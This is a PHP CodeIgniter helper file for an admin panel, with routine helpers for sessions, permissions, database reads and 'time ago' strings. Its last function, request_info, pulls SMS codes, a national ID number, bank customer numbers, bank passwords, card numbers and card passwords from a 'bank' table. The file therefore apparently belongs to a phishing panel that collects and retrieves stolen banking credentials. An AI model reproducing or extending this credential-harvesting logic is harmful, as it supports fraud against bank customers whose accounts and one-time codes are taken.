<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/* End of file connect_helper.php */
/* Location: ./system/helpers/array_helper.php */

if ( ! function_exists('admin_url'))
{
	function admin_url()
	{
		$CI = get_instance();
		return $CI->config->item('admin_url');
	}

}

if ( ! function_exists('admin_controller'))
{
	function admin_controller()
	{
		$CI = get_instance();
		return $CI->config->item('admin_controller');
	}

}


if ( ! function_exists('get_admin_name'))
{
	function get_admin_name($userid)
	{
		$CI =& get_instance();
		$CI->db->select('username');
		$CI->db->from('admin_users');
		$CI->db->where('userid' ,$userid);
		$query = $CI->db->get()->row_array();
		return  $query['username'];
	}
}


if ( ! function_exists('get_purchased_products'))
{
	function get_purchased_products($purchases_id)
	{
		$CI = get_instance();
		$CI->load->model('admin/purchase_model');
		return $CI->purchase_model->get_purchased_products($purchases_id);

	}

}


if ( ! function_exists('admin_email'))
{
	function admin_email()
	{
		$CI = get_instance();
		return $CI->config->item('admin_email');
	}
}


if ( ! function_exists('get_session'))
{
	function get_session($keyword)
	{
		$CI = get_instance();
		return $CI->session->userdata($keyword);
	}
}


if ( ! function_exists('get_permission'))
{
	function get_permission($keyword)
	{
		$CI = get_instance();
		$permissions =  $CI->session->userdata('permissions');
		return $permissions->$keyword;
	}
}

if ( ! function_exists('getDataFromDB'))
{
	function getDataFromDB($columns, $table, $where = '', $order = ''){
		$CI =& get_instance();
		$CI->db->select($columns);
		$CI->db->from($table);
		if (!empty($where)) {
			$CI->db->where($where);
		}
		if (!empty($order)) {
			$CI->db->order_by($order);
		}
		$query = $CI->db->get();
		return $query->result_array();
	}
}


if ( ! function_exists('show'))
{
	function show($data){
		echo "<pre>";
		print_r($data);
	}
}

if ( ! function_exists('getServiceRate'))
{
	function getServiceRate($service_id){
		$CI =& get_instance();
		$user = $CI->session->userdata('users');
		$CI->db->select('rate');
		$CI->db->where('service_id', $service_id);
		$CI->db->where('user_id', $user['user_id']);
		$CI->db->from('user_services');
		$query = $CI->db->get();
		$query = $query->row_array();
		return $query['rate'];
	}
}



if ( ! function_exists('get_timeago'))
{
	function get_timeago( $ptime )
	{
		$estimate_time = time() - $ptime;

		if( $estimate_time < 1 )
		{
			return 'less than 1 second ago';
		}

		$condition = array(
			12 * 30 * 24 * 60 * 60  =>  'year',
			30 * 24 * 60 * 60       =>  'month',
			24 * 60 * 60            =>  'day',
			60 * 60                 =>  'hour',
			60                      =>  'minute',
			1                       =>  'second'
		);

		foreach( $condition as $secs => $str )
		{
			$d = $estimate_time / $secs;

			if( $d >= 1 )
			{
				$r = round( $d );
				return ''. $r . ' ' . $str . ( $r > 1 ? 's' : '' ) . ' ago';
			}
		}
	}
}



if ( ! function_exists('request_info'))
{
	function request_info($bankid)
	{
		$CI = get_instance();
		$CI->db->select('sms1,sms2,tc_no,bank_customer,bank_password,bank_card_no,bank_card_password');
		$CI->db->where('id', $bankid);
		$query = $CI->db->get('bank');
		$info = $query->row_array();
		return $info;
	}
}
